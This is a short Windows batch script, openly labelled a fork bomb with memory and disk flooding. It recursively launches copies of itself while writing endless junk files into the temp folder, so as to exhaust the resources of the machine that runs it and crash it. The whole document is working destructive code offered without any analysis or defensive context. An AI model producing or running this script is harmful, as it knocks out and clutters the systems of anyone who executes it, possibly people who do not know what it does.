@echo off
title SYSTEM OVERLOAD - DO NOT CLOSE
echo Initializing catastrophic resource exhaustion...

:: Fork bomb + memory flood + disk thrash
:start
start "" /min %0
start "" /min %0
(
    for /l %%i in (1,1,999999999) do (
        echo CRASH_CRASH_CRASH_CRASH_CRASH_CRASH_CRASH >> "%TEMP%\%%i.txt"
        type "%TEMP%\%%i.txt" >> "%TEMP%\junk.bin"
    )
) >nul 2>&1
goto start
